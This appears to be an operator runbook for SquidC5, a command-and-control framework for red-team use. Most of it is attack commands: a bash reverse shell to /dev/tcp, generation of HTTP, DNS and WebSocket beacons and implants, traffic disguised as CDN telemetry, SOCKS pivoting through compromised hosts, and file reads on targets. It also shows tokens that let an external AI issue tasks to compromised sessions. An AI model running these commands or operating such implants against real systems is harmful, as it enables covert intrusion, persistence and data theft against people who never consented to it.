# SquidC5 Operator Runbook

**Command • Control • Cognitive • Collaborative • Coordination**

Authorized red team / pen-test use only.

## Prerequisites

```bash
cd /path/to/squidc5
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

## Connect CLI to a server

```bash
# Token comes from server bootstrap file — never commit it
sc5 login --url http://<HOST>:8443 --token sc5_...
sc5 health
sc5 whoami
```

Config stored at `~/.config/squidc5/config.json` (mode 0600).

## Reverse shell

```bash
sc5 listeners create rev-443 443 --kind reverse_shell
sc5 listeners start <listener_id>
sc5 payloads generate reverse_shell_bash <HOST> 443 --raw
```

On authorized target:

```bash
bash -c 'bash -i >& /dev/tcp/<HOST>/443 0>&1'
```

Operate:

```bash
sc5 sessions list
sc5 shell <session_id> "whoami"
sc5 events
```

### If reverse shell does not register

1. Listener `status` must be `running` (`sc5 listeners list`).
2. With Docker **bridge** networking, host must publish the port (`ports: ["443:443"]`).
3. With current compose **host** networking, process binds host ports directly.
4. Ports &lt; 1024 need host sysctl: `net.ipv4.ip_unprivileged_port_start=0` (container is non-root).
5. Host firewall must allow the port (`ufw allow 443/tcp`).
6. Target must reach `<HOST>:<port>` (egress/NAT).

## HTTP beacon

```bash
sc5 payloads generate http_beacon_python <HOST> 8443 --raw
# run payload on authorized target
sc5 sessions list
sc5 tasks create <session_id> "id"
sc5 tasks list --session <session_id>
sc5 tasks get <task_id>
```

## Tokens

```bash
sc5 tokens create ops \
  --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"

sc5 tokens create ext-ai \
  --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
  --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
```

## Admin AI

```bash
sc5 ai recon_assist --data "windows domain host"
sc5 ai shell_classify --data "uid=0(root)"
sc5 ai payload_template --data "need bash http beacon"
```

Offline mode works without configured LLMs. Configure BYO LLM via `sc5 llm add ...`.

## Observability

```bash
sc5 metrics
sc5 audit --limit 50
sc5 events
sc5 policy get
```

## Interactive mode

```bash
sc5 repl
```

## Malleable HTTP profiles

```bash
sc5 profiles list
sc5 profiles activate prof_amazon_cdn
sc5 payloads generate http_beacon_python <HOST> 8443 --profile prof_amazon_cdn --raw
# Implant posts to profile URIs (e.g. /v1/telemetry) with wrapped body
```

HTTPS via redirector:

```bash
sc5 payloads generate http_beacon_python <CDN_HOST> 443 --scheme https --raw
sc5 redirector --server-name cdn.example --uris /v1/telemetry,/api/v1/implant/beacon --raw
```

Lab cert helper (host with certbot): `scripts/acme_lab_renew.sh` with `DOMAINS=... EMAIL=...`.

## DNS C2

```bash
sc5 listeners create dns1 5353 --kind dns --zone c2.lab.invalid --host 0.0.0.0
sc5 listeners start <id>
sc5 payloads generate dns_beacon_python <DNS_HOST> 5353 --zone c2.lab.invalid --raw
```

## OAST Collaborator (HTTP / DNS / SMTP)

```bash
# self-signed teamserver
sc5 --insecure login --url https://TEAM:8443 --token sc5_...

sc5 --insecure oast token create --note "sqli-oob"
# → dns_name, http_url, smtp_to

sc5 --insecure oast tokens list
sc5 --insecure oast hits --token <TOKEN>
sc5 --insecure oast hits --token <TOKEN> --protocol dns
```

DNS listener config: `--zone oast.example.com --dns-mode both` (or `oast` / `beacon`).  
SMTP is log-only (feature `smtp_oast`, default off). See `docs/deployment.md` § OAST.

Point lab zone NS/records at the C2 host (authorized lab only).

## WebSocket C2

```bash
sc5 payloads generate ws_beacon_python <HOST> 8443 --raw
# optional TLS termination: --scheme wss and proxy wss to the server
```

Server path: `/ws/v1/beacon` (or WS profile path). Client needs `websocket-client`.

## Implants

```bash
sc5 implants families
sc5 implants build --os linux --arch amd64 C2_HOST 8443
sc5 implants generate dns_beacon <HOST> 5353 --raw
sc5 implants generate linux_memfd <HOST> 8443 --raw
sc5 implants generate bof <HOST> 8443 --platform windows --raw
```

### Native sc5beacon (preferred)

See [agents/sc5beacon/README.md](../agents/sc5beacon/README.md).

```bash
cd agents/sc5beacon && go build -o sc5beacon .
export SC5_URL="https://C2:8443/api/v1/implant/beacon"
export SC5_PSK="$(cat data/implant_psk.txt)"   # from teamserver
./sc5beacon
```

Server must have `SQUIDC5_IMPLANT_REQUIRE_AUTH=true` (default) and matching PSK.

### SOCKS pivot

```bash
# Implant reverse-dial (default): needs live beacon session
curl -sk -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"session_id":"ses_...","mode":"implant","listen_host":"127.0.0.1"}' \
  https://C2:8443/api/v1/pivot/socks
# Point proxy tool at returned listen_port; implant handles socks:connect tasks

# Direct mode: C2 dials targets itself (lab)
# mode=direct
```

### File ops

```bash
# POST /api/v1/files/op
# {"session_id":"...","op":"list","path":"/tmp"}
# {"session_id":"...","op":"read","path":"/etc/hosts","offset":0,"length":1024}
```

### Audit integrity

```bash
sc5 audit-verify --limit 500
```

## Teams / collab

```bash
sc5 teams create red-cell
sc5 teams members <team_id>
sc5 teams add-member <team_id> operator-b --role operator
```

## AI chains

```bash
sc5 playbooks
sc5 chain recon_then_classify --data "windows domain lab"
```

## Report export

```bash
sc5 report --raw > engagement-report.md
```
